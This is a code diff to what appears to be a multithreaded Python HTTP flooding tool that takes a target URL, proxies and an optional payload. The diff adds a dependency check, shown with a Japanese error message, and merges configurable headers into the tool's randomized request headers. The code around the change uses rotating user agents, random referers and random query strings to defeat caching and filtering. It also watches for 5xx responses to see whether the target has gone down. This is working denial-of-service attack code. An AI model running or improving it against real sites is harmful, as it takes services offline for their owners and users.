@@ -7,6 +7,12 @@ import sys
 import time
 import os
 
+try:
+    from dictknife import deepmerge
+except:
+    print("dictknifeモジュールが見つかりませんでした。\npip install dictknife してインストールしてください")
+    os._exit(0)
+
 print("""
 ██      ███████ ███    ███  ██████  ███    ██  █████  ██████  ███████ 
 ██      ██      ████  ████ ██    ██ ████   ██ ██   ██ ██   ██ ██      
@@ -113,6 +119,7 @@ class httpcall(threading.Thread):
         self.usenormaldelay = config["thread"]["usenormaldelay"]
         self.nodelay = config["thread"]["nodelay"]
         self.usepayload = config["usepayload"]
+        self.head = config["headers"]
         
         self.useproxies = config["useproxies"]
         self.limiter = config["thread"]["limiter"]
@@ -135,29 +142,23 @@ class httpcall(threading.Thread):
                         param_joiner = "?"
                 except IndexError:
                     continue
+                tmp = {
+                    "User-Agent": random.choice(self.useragents),
+                    "Cache-Control": "no-cache",
+                    "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
+                    "content-type": "application/json",
+                    "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
+                    "Keep-Alive": str(random.randint(110,120)),
+                    "Connection": "keep-alive",
+                    "Host": usehost
+                }
+                header = deepmerge(tmp,self.head)
                 if proxy == "":
                     try:
                         if self.usepayload == True:
-                            lres = requests.request(self.method,f"{useurl}{param_joiner}{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}",headers={
-                                "User-Agent": random.choice(self.useragents),
-                                "Cache-Control": "no-cache",
-                                "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
-                                "content-type": "application/json",
-                                "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
-                                "Keep-Alive": str(random.randint(110,120)),
-                                "Connection": "keep-alive",
-                                "Host": usehost
-                            },data=self.payload, timeout=self.timeout)
+                            lres = requests.request(self.method,f"{useurl}{param_joiner}{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}",headers=header,data=self.payload, timeout=self.timeout)
                         else:
-                            lres = requests.request(self.method,f"{useurl}{param_joiner}{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}",headers={
-                                "User-Agent": random.choice(self.useragents),
-                                "Cache-Control": "no-cache",
-                                "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
-                                "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
-                                "Keep-Alive": str(random.randint(110,120)),
-                                "Connection": "keep-alive",
-                                "Host": usehost
-                            }, timeout=self.timeout)
+                            lres = requests.request(self.method,f"{useurl}{param_joiner}{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}",headers=header, timeout=self.timeout)
                         #print(lres.text)
                         #proxies.append(proxy)
                         if str(lres.status_code).startswith("50"):
